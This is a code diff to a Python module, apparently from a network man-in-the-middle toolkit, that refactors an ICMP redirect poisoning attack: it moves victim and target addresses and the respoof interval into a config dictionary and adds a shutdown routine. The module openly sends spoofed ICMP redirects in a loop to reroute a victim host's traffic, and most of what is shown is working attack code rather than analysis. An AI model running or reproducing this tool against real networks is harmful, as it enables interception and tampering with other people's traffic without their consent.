@@ -5,45 +5,44 @@ import time
 import config
 import util
 
-""" Send ICMP redirects to a victim.  The victim
-    system needs to be configured to allow ICMP
-    redirects, which is not the default case.
-
-    More:
+""" 
 """
 
 
 class icmp(Poison):
     def __init__(self):
-        conf.verb   = 0
+        super(icmp, self).__init__('ICMP Redirection')
+        conf.verb = 0
         self.local  = (config.get('ip_addr'), get_if_hwaddr(config.get('iface')))
         self.victim = ()
         self.target = ()
-        super(icmp, self).__init__('ICMP Redirection')
+        self.config.update({"victim_ip":{"type":"ip", 
+                                         "value":None,
+                                         "required":True, 
+                                         "display":"Redirect host"},
+                            "target_ip":{"type":"ip", 
+                                         "value":None,
+                                         "required":True, 
+                                         "display":"Redirect victim to"},
+                            "respoof":{"type":"int", 
+                                       "value":15,
+                                       "required":False, 
+                    "display":"Interval (seconds) to send respoofed redirects"}
+                           })
+        self.info = """
+                    Send ICMP redirects to a victim.  The victim system needs
+                    to be configured to allow ICMP redirects, which is not 
+                    the default case.
+                    """
 
     def initialize(self):
         """ initialize a poison
         """
-        try:
-            util.Msg('Using interface [%s:%s]'
-                                        % (config.get('iface'), self.local[0]))
-            victim_ip = raw_input('[!] Redirect host: ')
-            target_ip = raw_input('[!] Redirect \'%s\' to \'%s\' from: '%(victim_ip,self.local[0]))
-            tmp = raw_input('[!] Redirect \'%s\' to \'%s\' from \'%s\'.  Is this correct? [y] '\
-                            %(victim_ip,self.local[0],target_ip))
-
-            self.victim = (victim_ip, getmacbyip(victim_ip))
-            self.target = (target_ip, getmacbyip(target_ip))
-        except KeyboardInterrupt:
-            return None
-        except Exception, e:
-            util.Error('Error loading ICMP poisoning module: %s' % (e))
-            return None
-
-        if 'n' in tmp.lower():
-            return None
-
         util.Msg('Initializing ICMP poison...')
+        self.victim = (self.config['victim_ip']['value'], 
+                getmacbyip(self.config['victim_ip']['value']))
+        self.target = (self.config['target_ip']['value'],
+                getmacbyip(self.config['target_ip']['value']))
 
         self.running = True
         thread = Thread(target=self.inject)
@@ -63,6 +62,16 @@ class icmp(Poison):
 
         while self.running:
             send(pkt)
-            time.sleep(15)
+            time.sleep(self.config['respoof']['value'])
 
         return self.victim[0]
+
+    def shutdown(self):
+        """ Shutdown ICMP spoofing
+        """
+        if self.running:
+            util.Msg("Shutting ICMP redirect down "\
+                    "(this could take up to %s seconds)" % \
+                        self.config['respoof']['value'])
+            self.running = False
+        return True
